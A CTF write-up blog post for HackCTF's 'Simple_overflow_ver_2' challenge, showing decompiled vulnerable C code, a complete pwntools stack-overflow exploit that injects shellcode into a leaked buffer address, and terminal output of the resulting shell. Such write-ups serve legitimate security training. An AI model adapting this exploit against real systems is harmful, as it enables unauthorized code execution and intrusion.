---
layout: post
title: "HackCTF Simple_overflow_ver_2"
author: "Ph4nt0m"
categories: [WriteUp, Pwnable]
date: 2021-03-31 17:00
tag: [WriteUp, HackCTF, Pwnable]
---

# Simple_overflow_ver_2

## Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // ebx
  char v5; // [esp+13h] [ebp-89h]
  char s[128]; // [esp+14h] [ebp-88h]
  int i; // [esp+94h] [ebp-8h]

  setvbuf(stdout, 0, 2, 0);
  v5 = 'y';
  do
  {
    printf("Data : ");
    if ( __isoc99_scanf(" %[^\n]s", s) )
    {
      for ( i = 0; ; ++i )
      {
        v3 = i;
        if ( v3 >= strlen(s) )
          break;
        if ( !(i & 0xF) )
          printf("%p: ", &s[i]);
        printf(" %c", (unsigned __int8)s[i]);
        if ( i % 16 == 15 )
          putchar(10);
      }
    }
    printf("\nAgain (y/n): ");
  }
  while ( __isoc99_scanf(" %c", &v5) && (v5 == 'y' || v5 == 'Y') );
  return 0;
}
```

## Solve

```python
from pwn import *

#context.log_level = 'DEBUG'
context.arch = 'i386'
e = ELF("./Simple_overflow_ver_2")
#p = process("./Simple_overflow_ver_2")
r = remote("ctf.j0n9hyun.xyz", 3006)
offset = 140
print r.recvuntil("Data : ")
r.sendline("AAAA")
buffer = int(r.recv(10), 16)
print hex(buffer)
print r.recvuntil("Again (y/n): ")
r.sendline("y")
print r.recvuntil("Data : ")

shell = shellcraft.i386.linux.sh()

payload = ''
payload += asm(shell)
payload += "\x90"*(offset - len(asm(shell)))
payload += p32(buffer)

r.sendline(payload)
r.interactive()
```

```bash
➜  hackctf python Simple_overflow_ver_2.py
[*] '/home/ubuntu/ctf/hackctf/Simple_overflow_ver_2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Opening connection to ctf.j0n9hyun.xyz on port 3006: Done
Data :
0xff8e9680
:  A A A A
Again (y/n):
Data :
[*] Switching to interactive mode
0xff8e9680:  j h h / / / s h / b i n \x89 ៨
0xff8e9690:     \x81 4 $ r i   1 ǠQ j \x04Y
0xff8e96a0:   󿟑 \x89 󿞱 Рj \x0bX ˠ\x80 \x90 \x90 \x90 \x90
0xff8e96b0:  \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90
0xff8e96c0:  \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90
0xff8e96d0:  \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90
0xff8e96e0:  \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90
0xff8e96f0:  \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90 \x90
0xff8e9700:  \x80
Again (y/n): $
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```